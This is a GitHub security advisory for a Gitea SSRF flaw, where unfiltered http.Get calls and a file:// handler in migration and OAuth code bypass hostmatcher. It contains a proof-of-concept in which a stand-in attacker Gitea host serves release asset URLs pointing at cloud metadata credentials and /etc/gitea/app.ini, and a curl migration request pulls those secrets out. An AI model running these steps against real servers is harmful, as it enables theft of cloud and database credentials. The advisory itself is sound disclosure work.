# [M] Gitea: SSRF via Migration Asset Downloads Bypasses hostmatcher — Reads Internal Files and Cloud Metadata

## Summary
Severity: Medium
Advisory: GHSA-2wm4-vwp6-v7xc
CVE: CVE-2026-59765
CWE: CWE-918
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:H/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N (CVSS_V4)
Published: 2026-07-21
Source: https://github.com/advisories/GHSA-2wm4-vwp6-v7xc
Type: github-advisory

## Affected
- Go: `code.gitea.io/gitea` — affected >=0 <1.27.0

## Details
### Summary

Gitea has robust SSRF protection via `hostmatcher.NewDialContext()` for webhook and migration clone URLs, which validates resolved IPs at the TCP dial level. However, three code paths use raw `http.Get()` (Go's `DefaultClient`) which completely bypasses this protection, enabling SSRF to internal services and local file read via the `file://` scheme.

### Vulnerable Code

**File: `modules/uri/uri.go` (line 32) -- Core vulnerability**

```go
func Open(uriStr string) (io.ReadCloser, error) {
    u, err := url.Parse(uriStr)
    switch strings.ToLower(u.Scheme) {
    case "http", "https":
        f, err := http.Get(uriStr)   // RAW http.Get -- no hostmatcher filtering
        return f.Body, nil
    case "file":
        return os.Open(u.Path)        // LOCAL FILE READ via file:// scheme
    }
}
```

**Callers in migration path:**
- `services/migrations/gitea_uploader.go:340` -- `uri.Open(*asset.DownloadURL)` for release assets
- `services/migrations/gitea_uploader.go:586` -- `uri.Open(pr.PatchURL)` for PR patches

**File: `services/migrations/dump.go` (lines 312, 453)**

```go
// Line 312 -- release asset download
resp, err := http.Get(*asset.DownloadURL)

// Line 453 -- PR patch download (with self-documenting TODO)
resp, err := http.Get(u) // TODO: This probably needs to use the downloader
```

**File: `routers/web/auth/oauth.go` (line 306)**

```go
func oauth2UpdateAvatarIfNeed(ctx *context.Context, url string, u *user_model.User) {
    resp, err := http.Get(url)    // RAW http.Get -- no hostmatcher
```

**Contrast with protected migration clone (same codebase):**

```go
// services/migrations/migrate.go:526 -- PROTECTED with hostmatcher
transport.DialContext = hostmatcher.NewDialContext("migration", allowList, blockList, ...)
```

### PoC

```bash
# Step 1: Set up attacker Gitea instance with malicious release asset URLs
# Create a repo on evil.gitea.attacker.com with a release asset whose
# download_url points to internal services:

# Asset DownloadURL set to: http://169.254.169.254/latest/meta-data/iam/security-credentials/role
# Or: file:///etc/gitea/app.ini (local file read)

# Step 2: Admin triggers migration from attacker's Gitea instance
curl -s -X POST "https://target-gitea.com/api/v1/repos/migrate" \
  -H "Authorization: token ADMIN_API_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "clone_addr": "https://evil.gitea.attacker.com/user/repo.git",
    "repo_name": "migrated-repo",
    "repo_owner": "admin",
    "service": "gitea"
  }'

# Step 3: During migration, Gitea downloads release assets using unfiltered http.Get()
# Cloud metadata is saved as the release asset attachment in the migrated repo
# Or app.ini contents (with DB credentials, JWT secrets) are saved via file:// scheme

# Step 4: Attacker accesses the migrated repo's release assets to retrieve stolen data
curl -s "https://target-gitea.com/admin/migrated-repo/releases/download/v1.0/stolen-metadata.txt"
```

### Impact

- **Cloud metadata theft:** `169.254.169.254` reachable via unfiltered `http.Get()` (AWS IMDSv1 credentials, GCP tokens)
- **Local file read:** `file://` scheme in `uri.Open()` reads `/etc/gitea/app.ini` (database credentials, JWT signing secrets, SMTP passwords)
- **Internal service scanning:** Reach `127.0.0.1`, `10.x`, `172.16-31.x`, `192.168.x` networks
- **Bypasses existing SSRF protection:** The `hostmatcher` dialer is comprehensive but only applied to webhook and clone transports -- these three paths are unprotected
- Migration vectors require migration permission (admin/org owner); OAuth vector requires admin-configured custom OAuth2 source

## References
- https://github.com/go-gitea/gitea/security/advisories/GHSA-2wm4-vwp6-v7xc
- https://github.com/go-gitea/gitea
- https://github.com/go-gitea/gitea/releases/tag/v1.27.0
